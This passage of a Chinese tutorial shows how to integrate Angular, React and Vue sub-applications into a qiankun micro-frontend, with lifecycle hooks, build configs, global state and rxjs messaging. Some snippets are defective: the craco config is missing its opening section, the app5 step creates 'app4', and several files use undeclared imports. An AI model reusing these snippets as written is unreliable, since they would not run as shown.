start="3"><li>配置微应用</li></ol><p><code>ng add single-spa</code><br /><code>ng add single-spa-angular </code></p><p>在生成 single-spa 配置后，我们需要进行一些 qiankun 的接入配置。我们在 Angular 微应用的入口文件 <br /><code>main.single-spa.ts</code> 中，导出 qiankun 主应用所需要的三个生命周期钩子函数，代码实现如下：</p><p><code>app2\src\main.single-spa.ts</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import &#123; enableProdMode, NgZone &#125; from &#x27;@angular/core&#x27;;</span><br><span class="line">import &#123; platformBrowserDynamic &#125; from &#x27;@angular/platform-browser-dynamic&#x27;;</span><br><span class="line">import &#123; NavigationStart, Router &#125; from &#x27;@angular/router&#x27;;</span><br><span class="line">import &#123; getSingleSpaExtraProviders, singleSpaAngular &#125; from &#x27;single-spa-angular&#x27;;</span><br><span class="line">import &#123; AppModule &#125; from &#x27;./app/app.module&#x27;;</span><br><span class="line">import &#123; environment &#125; from &#x27;./environments/environment&#x27;;</span><br><span class="line">import &#123; singleSpaPropsSubject &#125; from &#x27;./single-spa/single-spa-props&#x27;;</span><br><span class="line"></span><br><span class="line">if (environment.production) &#123;</span><br><span class="line">  enableProdMode();</span><br><span class="line">&#125;</span><br><span class="line">const __qiankun__ = (&lt;any&gt;window).__POWERED_BY_QIANKUN__;</span><br><span class="line"></span><br><span class="line">if (!__qiankun__) &#123;</span><br><span class="line">  platformBrowserDynamic().bootstrapModule(AppModule)</span><br><span class="line">    .catch(err =&gt; console.error(err));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const lifecycles = singleSpaAngular(&#123;</span><br><span class="line">  bootstrapFunction: singleSpaProps =&gt; &#123;</span><br><span class="line">    singleSpaPropsSubject.next(singleSpaProps);</span><br><span class="line">    return platformBrowserDynamic(getSingleSpaExtraProviders()).bootstrapModule(AppModule);</span><br><span class="line">  &#125;,</span><br><span class="line">  template: &#x27;&lt;app-root /&gt;&#x27;,</span><br><span class="line">  Router,</span><br><span class="line">  NavigationStart,</span><br><span class="line">  NgZone</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">export const bootstrap = lifecycles.bootstrap;</span><br><span class="line">export const mount = lifecycles.mount;</span><br><span class="line">export const unmount = lifecycles.unmount;</span><br></pre></td></tr></table></figure><ol start="4"><li>添加启动命令</li></ol><p>app2: <br /><code>&quot;serve:single-spa&quot;: &quot;ng s --project app2 --disable-host-check --port 8082 --live-reload false&quot;</code></p><p><a name="lGhPC"></a></p><h2 id="接入-Angular-子应用-app3-Angular13"><a href="#接入-Angular-子应用-app3-Angular13" class="headerlink" title="接入 Angular 子应用 app3(Angular13)"></a>接入 Angular 子应用 app3(Angular13)</h2><ol><li><p>创建子应用 app3, Angular 子应用, app3 采用了最新版 Angular13,<br /><code>ng new app3</code></p></li><li><p>配置微应用<br /><code>app3\src\main.ts</code></p></li><li><p>添加启动命令<br /><code>&quot;serve:single-spa&quot;: &quot;ng s --project app3 --disable-host-check --port 8083 --live-reload false&quot;</code><br><a name="VgdXH"></a></p></li></ol><h2 id="接入-React-子应用-app4-React17-craco"><a href="#接入-React-子应用-app4-React17-craco" class="headerlink" title="接入 React 子应用 app4(React17 craco)"></a>接入 React 子应用 app4(React17 craco)</h2><ol><li>创建子应用 app4,React 子应用</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx create-react-app app4 --template typescript</span><br></pre></td></tr></table></figure><ol start="2"><li>子应用改造</li></ol><p><br /><code>app4\craco.config.js</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">            webpackConfig.plugins = [</span><br><span class="line">                ...webpackConfig.plugins,</span><br><span class="line">                new WebpackBar(&#123;</span><br><span class="line">                    profile: true</span><br><span class="line">                &#125;),</span><br><span class="line">            ];</span><br><span class="line"></span><br><span class="line">            return webpackConfig</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [&#123;</span><br><span class="line">        plugin: CracoLessPlugin,</span><br><span class="line">        // 自定义主题配置</span><br><span class="line">        options: &#123;</span><br><span class="line">            lessLoaderOptions: &#123;</span><br><span class="line">                lessOptions: &#123;</span><br><span class="line">                    modifyVars: &#123;</span><br><span class="line">                        &#x27;@primary-color&#x27;: &#x27;#1DA57A&#x27;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    javascriptEnabled: true</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;],</span><br><span class="line">    //抽离公用模块</span><br><span class="line">    optimization: &#123;</span><br><span class="line">        splitChunks: &#123;</span><br><span class="line">            cacheGroups: &#123;</span><br><span class="line">                commons: &#123;</span><br><span class="line">                    chunks: &#x27;initial&#x27;,</span><br><span class="line">                    minChunks: 2,</span><br><span class="line">                    maxInitialRequests: 5,</span><br><span class="line">                    minSize: 0</span><br><span class="line">                &#125;,</span><br><span class="line">                vendor: &#123;</span><br><span class="line">                    test: /node_modules/,</span><br><span class="line">                    chunks: &#x27;initial&#x27;,</span><br><span class="line">                    name: &#x27;vendor&#x27;,</span><br><span class="line">                    priority: 10,</span><br><span class="line">                    enforce: true</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    devServer: &#123;</span><br><span class="line">        port: 8084,</span><br><span class="line">        headers: &#123;</span><br><span class="line">            &#x27;Access-Control-Allow-Origin&#x27;: &#x27;*&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        proxy: &#123;</span><br><span class="line">            &#x27;/api&#x27;: &#123;</span><br><span class="line">                target: &#x27;https://placeholder.com/&#x27;,</span><br><span class="line">                changeOrigin: true,</span><br><span class="line">                secure: false,</span><br><span class="line">                xfwd: false,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /><code>app4\src\index.tsx</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import React from &#x27;react&#x27;;</span><br><span class="line">import ReactDOM from &#x27;react-dom&#x27;;</span><br><span class="line">import &#123; BrowserRouter as Router &#125; from &quot;react-router-dom&quot;;</span><br><span class="line">import &#x27;./index.css&#x27;;</span><br><span class="line">import App from &#x27;./App&#x27;;</span><br><span class="line">import &#123; setPager &#125; from &#x27;./core/app.pager&#x27;;</span><br><span class="line">import &#x27;./public_path&#x27;;</span><br><span class="line"></span><br><span class="line">function render(props: any) &#123;</span><br><span class="line">  const &#123; container, pager &#125; = props;</span><br><span class="line">  setPager(pager);</span><br><span class="line"></span><br><span class="line">  ReactDOM.render(</span><br><span class="line">    &lt;App /&gt;,</span><br><span class="line">    getSubRootContainer(container)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getSubRootContainer(container: any) &#123;</span><br><span class="line"></span><br><span class="line">  return container ? container.querySelector(&#x27;#root&#x27;) : document.querySelector(&#x27;#root&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!window.__POWERED_BY_QIANKUN__) &#123;</span><br><span class="line">  render(&#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export async function bootstrap() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">export async function mount(props: any) &#123;</span><br><span class="line"></span><br><span class="line">  render(props)</span><br><span class="line">&#125;</span><br><span class="line">export async function unmount(props: any) &#123;</span><br><span class="line">  const &#123; container &#125; = props;</span><br><span class="line">  ReactDOM.unmountComponentAtNode(getSubRootContainer(container));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>添加启动命令</li></ol><p><code>&quot;serve:single-spa&quot;: &quot;set PORT=8084 &amp;&amp; craco start FAST_REFRESH=true&quot;</code></p><p><a name="gvt9b"></a></p><h2 id="接入-React-子应用-app5-React17-react-scripts"><a href="#接入-React-子应用-app5-React17-react-scripts" class="headerlink" title="接入 React 子应用 app5(React17 react-scripts)"></a>接入 React 子应用 app5(React17 react-scripts)<br /><br /></h2><ol><li>创建子应用 app5,React 子应用</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx create-react-app app4 --template typescript</span><br></pre></td></tr></table></figure><ol start="2"><li>子应用改造</li></ol><p><code>app5\config-overrides.js</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">    webpack: (config) =&gt; &#123;</span><br><span class="line">        config.output.library = &#x27;app5&#x27;;</span><br><span class="line">        config.output.libraryTarget = &#x27;umd&#x27;;</span><br><span class="line">        config.output.publicPath = &#x27;http://localhost:8085/&#x27;;</span><br><span class="line">        return config;</span><br><span class="line">    &#125;,</span><br><span class="line">    devServer: (configFunction) =&gt; &#123;</span><br><span class="line">        return function (proxy, allowedHost) &#123;</span><br><span class="line">            const config = configFunction(proxy, allowedHost);</span><br><span class="line">            config.headers = &#123;</span><br><span class="line">                &quot;Access-Control-Allow-Origin&quot;: &#x27;*&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">            return config</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /><code>app5\src\index.tsx</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import React from &#x27;react&#x27;;</span><br><span class="line">import ReactDOM from &#x27;react-dom&#x27;;</span><br><span class="line">import &#x27;./index.css&#x27;;</span><br><span class="line">import App from &#x27;./App&#x27;;</span><br><span class="line">import &#x27;./public_path&#x27;;</span><br><span class="line">import &#123; setPager &#125; from &#x27;./core/app.pager&#x27;;</span><br><span class="line"></span><br><span class="line">function render(props: any) &#123;</span><br><span class="line">  const &#123; container,pager &#125; = props;</span><br><span class="line">  setPager(pager);</span><br><span class="line"></span><br><span class="line">  ReactDOM.render(</span><br><span class="line">    &lt;React.StrictMode&gt;</span><br><span class="line">      &lt;App /&gt;</span><br><span class="line">    &lt;/React.StrictMode&gt;,</span><br><span class="line">    getSubRootContainer(container)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getSubRootContainer(container: any) &#123;</span><br><span class="line"></span><br><span class="line">  return container ? container.querySelector(&#x27;#root&#x27;) : document.querySelector(&#x27;#root&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!window.__POWERED_BY_QIANKUN__) &#123;</span><br><span class="line">  render(&#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export async function bootstrap() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">export async function mount(props: any) &#123;</span><br><span class="line"></span><br><span class="line">  render(props)</span><br><span class="line">&#125;</span><br><span class="line">export async function unmount(props: any) &#123;</span><br><span class="line">  const &#123; container &#125; = props;</span><br><span class="line">  ReactDOM.unmountComponentAtNode(getSubRootContainer(container));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>添加启动命令</li></ol><p><code>&quot;serve:single-spa&quot;: &quot;react-app-rewired start&quot;</code></p><p><a name="flofy"></a></p><h2 id="通过二级路由初始化"><a href="#通过二级路由初始化" class="headerlink" title="通过二级路由初始化"></a>通过二级路由初始化</h2><p>在实际项目开发中,我们所需要展示的页面通常不是一级路由直接呈现的, 可能会存在多母版页, 多级嵌套场景, 这种情况下可能需要在主应用导航到某个页面之后再呈现子应用的内容.我们可以在某个二级路由进行微应用的初始化.<br />首先我们需要创建一个二级路由<code>/potal/.</code><em>(在以 Angular, React 技术为主应用时,实现原理也是一样的.)</em><br /><code>appbase\src\views\portal</code></p><p>经过改造后完整<code>main.ts</code>完整代码如下<br />130-132 行:去掉了原来在 main.ts 中的启动方式, 该方法调用在 protal 页面中实现.</p><p><a name="R8pje"></a></p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构<br /><br /></h2><p>项目总体结构如下项目结构如下</p><blockquote><p>qiankunapp <br />├─ app1 <br />├─ app2 <br />├─ app3 <br />├─ app4 <br />├─ app5 <br />└─ appbase</p></blockquote><p><br />appbase: 基座应用(主应用), vue3 + typescript + tsx + antv</p><ul><li>app1 - app5 表示不同技术框架的子应用</li><li>app1: vue3 + typescript + tsx + antv</li><li>app2: Angular12 + typescript + ngzorro</li><li>app3: Angular13 + typescript + ngzorro</li><li>app4: React17 + typescript + craco + antd</li><li>app5: React17 + typescript + react-scripts +antd</li></ul><p><strong>完整功能演示</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/26114887/1644561501321-dd1d66db-d1b6-4579-b0a3-3c88ff1e3fa2.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/26114887/1644561501321-dd1d66db-d1b6-4579-b0a3-3c88ff1e3fa2.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />微服务应用功能演示</p><p><a name="YDL7G"></a></p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p><a name="CcS1B"></a></p><h3 id="全局状态管理"><a href="#全局状态管理" class="headerlink" title="全局状态管理"></a>全局状态管理</h3><p><br />主应用<br /><code>appbase\src\views\portal\index.tsx</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import &#123;</span><br><span class="line">  FrameworkConfiguration,</span><br><span class="line">  initGlobalState,</span><br><span class="line">  MicroAppStateActions,</span><br><span class="line">  start</span><br><span class="line">&#125; from &#x27;qiankun&#x27;;</span><br><span class="line"></span><br><span class="line">// 初始化 state</span><br><span class="line">const state: Record&lt;string, any&gt; = &#123;</span><br><span class="line">  &#x27;main.version&#x27;: &#x27;v0.0.1&#x27;</span><br><span class="line">&#125;;</span><br><span class="line">const actions: MicroAppStateActions = initGlobalState(state);</span><br><span class="line">actions.setGlobalState(state);</span><br></pre></td></tr></table></figure><p><br />子应用<br /><code>app1\src\main.ts</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">export async function mount(props: any) &#123;</span><br><span class="line"></span><br><span class="line">    // 订阅主应用全局状态变更通知事件</span><br><span class="line">    props.onGlobalStateChange((state, prev) =&gt; &#123;</span><br><span class="line">        // state: 变更后的状态; prev 变更前的状态</span><br><span class="line">        console.log(state, prev);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    render(props);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="vYn1q"></a></p><h3 id="应用间通讯"><a href="#应用间通讯" class="headerlink" title="应用间通讯"></a>应用间通讯</h3><p><br />这里我们采用了<code>rxjs</code>实现应用间的消息发布&#x2F;订阅<br />主应用<br /><code>appbase\src\core\app.pager.ts</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import &#123; filter, throttleTime &#125; from &#x27;rxjs/operators&#x27;;</span><br><span class="line">// 消息来源</span><br><span class="line">export enum PagerEnum &#123;</span><br><span class="line">    // 主应用</span><br><span class="line">    BASE = 1,</span><br><span class="line">    // 子应用</span><br><span class="line">    SUB = 2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 消息主体类型</span><br><span class="line">export interface PagerMessage &#123;</span><br><span class="line">    from: PagerEnum;</span><br><span class="line">    data: any;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export const AppPager: Subject&lt;PagerMessage&gt; = new Subject();</span><br><span class="line"></span><br><span class="line">// 主应用下发消息</span><br><span class="line">export const PagerIssue = data =&gt; &#123;</span><br><span class="line">    const msg: PagerMessage = &#123;</span><br><span class="line">        from: PagerEnum.BASE,</span><br><span class="line">        data: data</span><br><span class="line">    &#125;;</span><br><span class="line">    AppPager.next(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 主应用收集子应用的消息</span><br><span class="line">export const PagerCollect: Observable&lt;PagerMessage&gt; = AppPager.pipe(</span><br><span class="line">    throttleTime(500),</span><br><span class="line">    filter((msg: any) =&gt; msg.from == PagerEnum.SUB)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// pager数据处理</span><br><span class="line">export const HandlePagerMessage = (&#123; type, url &#125;) =&gt; &#123;</span><br><span class="line">    switch (type) &#123;</span><br><span class="line">        case &#x27;navigate&#x27;:</span><br><span class="line">            &#123;</span><br><span class="line">                router.replace(url);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">            console.log(&#x27;未识别的操作&#x27;);</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />子应用<br /><code>app1\src\core\app.pager.ts</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import &#123; Subject, Observable &#125; from &quot;rxjs&quot;;</span><br><span class="line"></span><br><span class="line">let SubAppPager;</span><br><span class="line"></span><br><span class="line">export const setPager = (_pager: Subject&lt;any&gt;) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    SubAppPager = _pager;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export const getPager = (): Subject&lt;any&gt; =&gt; SubAppPager;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 消息来源</span><br><span class="line">export enum PagerEnum &#123;</span><br><span class="line">    // 主应用</span><br><span class="line">    BASE = 1,</span><br><span class="line">    // 子应用</span><br><span class="line">    SUB = 2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 消息主体类型</span><br><span class="line">export interface PagerMessage &#123;</span><br><span class="line">    from: PagerEnum;</span><br><span class="line">    data: any;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 子应用上报消息</span><br><span class="line">export const SubAppPagerIssue = data =&gt; &#123;</span><br><span class="line">    if (!SubAppPager) SubAppPager = getPager();</span><br><span class="line">    const msg: PagerMessage = &#123;</span><br><span class="line">        from: PagerEnum.SUB,</span><br><span class="line">        data: data</span><br><span class="line">    &#125;;</span><br><span class="line">    SubAppPager.next(&#123; ...msg &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 订阅主应用下发的消息</span><br><span class="line">export const SubAppPagerCollect = (): Observable&lt;PagerMessage&gt; =&gt; &#123;</span><br><span class="line">    if (!SubAppPager) SubAppPager = getPager();</span><br><span class="line">    return SubAppPager.pipe(</span><br><span class="line">        throttleTime(500),</span><br><span class="line">        filter((msg: any) =&gt; msg.from == PagerEnum.BASE)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />发送消息<br />主应用下发消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 下发消息</span><br><span class="line">import &#123; PagerIssue &#125; from &quot;@/core/app.pager&quot;;</span><br><span class="line"></span><br><span class="line">const onIssue = () =&gt; &#123;</span><br><span class="line"></span><br><span class="line">  PagerIssue(&#x27;i am from baseapp&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子应用接收</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// 订阅消息</span><br><span class="line">import &#123; Subscription &#125; from &quot;rxjs&quot;;</span><br><span class="line">import &#123; defineComponent, onMounted, onUnmounted &#125; from &quot;vue&quot;;</span><br><span class="line">import &#123;</span><br><span class="line">  SubAppPagerIssue,</span><br><span class="line">  SubAppPagerCollect,</span><br><span class="line">  PagerMessage,</span><br><span class="line">&#125; from &quot;../core/app.pager&quot;;</span><br><span class="line"></span><br><span class="line">let pagerSub: Subscription = new Subscription();</span><br><span class="line"></span><br><span class="line">onMounted(async () =&gt; &#123;</span><br><span class="line">  pagerSub = SubAppPagerCollect().subscribe((msg: PagerMessage) =&gt; &#123;</span><br><span class="line">    if (msg) &#123;</span><br><span class="line">      // 可在app.pager中实现主应用消息的统一处理</span><br><span class="line">      console.log(&quot;app1 接收到主应用消息 : &quot;, msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">onUnmounted(() =&gt; &#123;</span><br><span class="line">  pagerSub?.unsubscribe?.();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br />子应用上报消息, 主应用接收</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// app1\src\views\Home.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;home&quot;&gt;</span><br><span class="line">    &lt;a-button type=&quot;primary&quot; @click=&quot;onIssueMsg&quot;&gt;上报消息&lt;/a-button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">export default defineComponent(&#123;</span><br><span class="line">  name: &quot;Home&quot;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    let pagerSub: Subscription = new Subscription();</span><br><span class="line"></span><br><span class="line">    const onIssueMsg = async () =&gt; &#123;</span><br><span class="line">      SubAppPagerIssue(&quot;i am from app1&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      onIssueMsg</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span 